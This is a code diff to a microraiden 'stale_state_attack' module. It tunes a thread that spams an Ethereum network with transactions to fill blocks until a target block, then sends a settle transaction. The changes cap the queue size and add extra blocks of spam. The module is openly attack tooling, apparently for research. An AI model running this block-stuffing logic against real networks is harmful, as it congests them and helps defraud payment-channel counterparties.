@@ -8,6 +8,7 @@ from microraiden.stale_state_attack.config import (
     GAS_PRICE,
     GAS_LIMIT,
     BLOCK_SIZE,
+    MAX_TX_QUEUE_SIZE,
 )
 from microraiden.utils import privkey_to_addr
 from microraiden.stale_state_attack.utils import create_signed_transaction
@@ -71,9 +72,6 @@ class SpamManager(threading.Thread):
 
         while self.do_run:
             if (self.target_block_reached()) & (not self.settle_sent):
-                # Stop spamming
-                do_send = False
-
                 # Create and send a settle transaction
                 nonce = self.web3.eth.getTransactionCount(
                     privkey_to_addr(self.private_key), 'pending')
@@ -86,23 +84,21 @@ class SpamManager(threading.Thread):
                     do_send = True
                 except Exception as e:
                     self.logger.error('Sending settle transaction failed: {}'.format(e))
-            elif self.target_block is not None:
-                pending_transactions = int(self.web3.txpool.status.pending, 16)
-                do_send = pending_transactions < self.desired_pending_txs()
-                desired_queued_txs = self.desired_pending_txs() - pending_transactions
-
-                self.logger.debug(
-                    'Current block = {} / Target block = {}'.format(self.web3.eth.blockNumber, self.target_block))
-                self.logger.info('Pending transactions = {} / Desired Pending = {} / Queued transactions = {} / Threads = {} / Target block = {} / Remaining blocks = {}'.format(
-                    pending_transactions, self.desired_pending_txs(), len(tx_queue), threading.active_count(), self.target_block, self.target_block - self.web3.eth.blockNumber))
             else:
                 pending_transactions = int(self.web3.txpool.status.pending, 16)
                 do_send = pending_transactions < self.desired_pending_txs()
-                desired_queued_txs = self.desired_pending_txs() - pending_transactions
+                desired_queued_txs = min(self.desired_pending_txs() -
+                                         pending_transactions, MAX_TX_QUEUE_SIZE)
 
-                self.logger.debug('Current block = {}'.format(self.web3.eth.blockNumber))
-                self.logger.info('Pending transactions = {} / Desired Pending = {} / Queued transactions = {} / Threads = {}'.format(
-                    pending_transactions, self.desired_pending_txs(), len(tx_queue), threading.active_count()))
+                if self.target_block is not None:
+                    self.logger.debug(
+                        'Current block = {} / Target block = {}'.format(self.web3.eth.blockNumber, self.target_block))
+                    self.logger.info('Pending transactions = {} / Desired Pending = {} / Queued transactions = {} / Threads = {} / Target block = {} / Remaining blocks = {}'.format(
+                        pending_transactions, self.desired_pending_txs(), len(tx_queue), threading.active_count(), self.target_block, self.target_block - self.web3.eth.blockNumber))
+                else:
+                    self.logger.debug('Current block = {}'.format(self.web3.eth.blockNumber))
+                    self.logger.info('Pending transactions = {} / Desired Pending = {} / Queued transactions = {} / Threads = {}'.format(
+                        pending_transactions, self.desired_pending_txs(), len(tx_queue), threading.active_count()))
 
             time.sleep(1)
 
@@ -140,7 +136,8 @@ class SpamManager(threading.Thread):
         Wait until the queue of transactions to be sent next
         has reached the minimum number of transactions.
         '''
-        while len(tx_queue) < self.desired_pending_txs():
+        global desired_queued_txs
+        while len(tx_queue) < desired_queued_txs:
             time.sleep(0.25)
 
     def remaining_blocks(self) -> int:
@@ -152,7 +149,7 @@ class SpamManager(threading.Thread):
         return max(0, self.target_block - self.web3.eth.blockNumber)
 
     def desired_pending_txs(self) -> int:
-        return self.remaining_blocks() * BLOCK_SIZE
+        return (self.remaining_blocks() + 2) * BLOCK_SIZE
 
     def stop(self):
         '''
